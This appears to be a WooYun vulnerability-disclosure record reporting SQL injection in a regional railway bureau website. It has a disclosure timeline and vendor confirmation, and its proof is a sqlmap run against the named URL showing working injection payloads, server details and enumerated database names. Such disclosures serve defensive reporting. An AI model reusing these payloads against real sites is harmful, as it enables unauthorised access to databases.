{"id": 40931, "wybug_id": "wooyun-2015-090424", "wybug_title": "某地区铁路局网站SQL注入", "wybug_corp": "12306", "wybug_author": "路人甲", "wybug_date": "2015-01-07 15:12", "wybug_open_date": "2015-02-21 15:14", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向公众公开  简要描述： RT 详细说明：  \n\n\n\n   漏洞证明：  \n[root@Hacker~]# Sqlmap sqlmap -u \"http://www.cd-rail.com/RailWay/Search?s=aa\" -v 1 --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to o[*] starting at 10:08:58[10:08:58] [INFO] resuming back-end DBMS 'mysql'[10:08:59] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: s    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: s=aa%' AND 9319=9319 AND '%'='    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: s=aa%' AND (SELECT 6109 FROM(SELECT COUNT(*),CONCAT(0x71796a6271,(SELECT (CASE WHEN (6109=6109) THEN 1 ELSE 0 END)),0x7162707371    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: s=aa%' UNION ALL SELECT CONCAT(0x71796a6271,0x425a466d7143544d6857,0x7162707371),95,95,95,95#    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: s=aa%'; SELECT SLEEP(5)--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: s=aa%' AND SLEEP(5) AND '%'='---[10:08:59] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: MySQL 5.0[10:08:59] [INFO] fetching database names[10:08:59] [WARNING] reflective value(s) found and filtering out[10:08:59] [WARNING] something went wrong with full UNION technique (most probably because of limitation on retrieved number of entries). Fal[10:09:00] [WARNING] the SQL query provided does not return any output[10:09:00] [INFO] the SQL query used returns 4 entries[10:09:00] [INFO] resumed: information_schema[10:09:00] [INFO] resumed: mysql[10:09:00] [INFO] resumed: performance_schema[10:09:00] [INFO] resumed: roadwayavailable databases [4]:[*] information_schema[*] mysql[*] performance_schema[*] roadway[10:09:00] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unha[10:09:00] [INFO] fetched data logged to text files under 'E:\\360?~1\\SQLMAP~1.4\\Bin\\output\\www.cd-rail.com'\n   修复方案：  null   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-01-07 15:37 厂商回复： 正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}